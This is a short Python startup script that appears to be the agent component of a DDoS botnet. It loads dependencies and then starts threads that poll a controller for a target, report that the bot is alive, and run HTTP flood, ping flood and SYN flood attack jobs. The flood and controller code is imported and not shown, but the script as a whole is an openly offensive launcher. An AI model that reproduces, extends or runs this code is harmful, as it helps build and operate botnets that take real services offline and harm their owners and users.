# Run dependency injections
import os
import tekleo_common_utils
import rvkinh_utils
import rvkinh_message_client
from injectable import load_injection_container
load_injection_container()
load_injection_container(str(os.path.dirname(tekleo_common_utils.__file__)))
load_injection_container(str(os.path.dirname(rvkinh_utils.__file__)))
load_injection_container(str(os.path.dirname(rvkinh_message_client.__file__)))

# Other dependencies
import threading

# Initialize jobs
from jobs.jobs_registry import JOB_CONTROLLER_GET_GOAL, JOB_CONTROLLER_NOTIFY_ALIVE, JOB_ATTACK_HTTP_FLOOD, JOB_ATTACK_PING_FLOOD, JOB_ATTACK_SYN_FLOOD
thread1 = threading.Thread(target=JOB_CONTROLLER_GET_GOAL.job_loop)
thread1.start()
JOB_CONTROLLER_GET_GOAL.start()
thread2 = threading.Thread(target=JOB_CONTROLLER_NOTIFY_ALIVE.job_loop)
thread2.start()
JOB_CONTROLLER_NOTIFY_ALIVE.start()
thread3 = threading.Thread(target=JOB_ATTACK_HTTP_FLOOD.job_loop)
thread3.start()
JOB_ATTACK_HTTP_FLOOD.start()
thread4 = threading.Thread(target=JOB_ATTACK_PING_FLOOD.job_loop)
thread4.start()
JOB_ATTACK_PING_FLOOD.start()
thread5 = threading.Thread(target=JOB_ATTACK_SYN_FLOOD.job_loop)
thread5.start()
JOB_ATTACK_SYN_FLOOD.start()
